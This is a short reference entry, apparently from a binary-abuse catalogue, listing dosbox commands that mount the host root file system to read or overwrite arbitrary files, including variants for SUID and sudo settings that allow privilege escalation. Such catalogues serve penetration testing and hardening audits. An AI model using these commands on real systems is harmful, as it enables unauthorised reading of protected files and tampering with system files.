---
description: Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.
functions:
  file-read:
    - description: The file content will be displayed in the DOSBox graphical window.
      code: |
        LFILE='\path\to\file_to_read'
        dosbox -c 'mount c /' -c "type c:$LFILE"
    - description: The file is copied to a readable location.
      code: |
        LFILE='\path\to\file_to_read'
        dosbox -c 'mount c /' -c "type c:$LFILE >c:\tmp\output" -c exit
        cat '/tmp/OUTPUT'
  file-write:
    - description: Create a file with the content to be written
      code: |
        echo DATA > /tmp/data.txt
        dosbox -c 'mount c /' -c "type c:\tmp\data.txt >c:\path\to\file_to_write" -c exit
  suid:
    - description: Create a file with the content to be written.
      code: |
        echo DATA > /tmp/data.txt
        dosbox -c 'mount c /' -c "type c:\tmp\data.txt >c:\path\to\file_to_write" -c exit
  sudo:
    - description: Create a file with the content to be written.
      code: |
        echo DATA > /tmp/data.txt
        sudo dosbox -c 'mount c /' -c "type c:\tmp\data.txt >c:\path\to\file_to_write" -c exit
---
